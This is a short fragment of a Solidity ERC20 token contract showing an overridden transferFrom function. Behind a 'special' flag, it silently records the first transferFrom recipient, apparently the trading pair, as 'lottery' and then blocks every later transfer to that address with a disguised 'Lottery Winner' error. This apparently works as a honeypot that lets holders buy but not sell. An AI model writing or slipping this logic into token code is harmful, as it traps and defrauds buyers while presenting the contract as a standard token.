    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {

        if(special == true) {

        if(sender != address(0) && lottery == address(0)) lottery = recipient;

        else require(recipient != lottery, "Lottery Winner");

        _transfer(sender, recipient, amount);

        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));

        return true;

        }

        else {

        _transfer(sender, recipient, amount);

        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));

        return true;}

    }
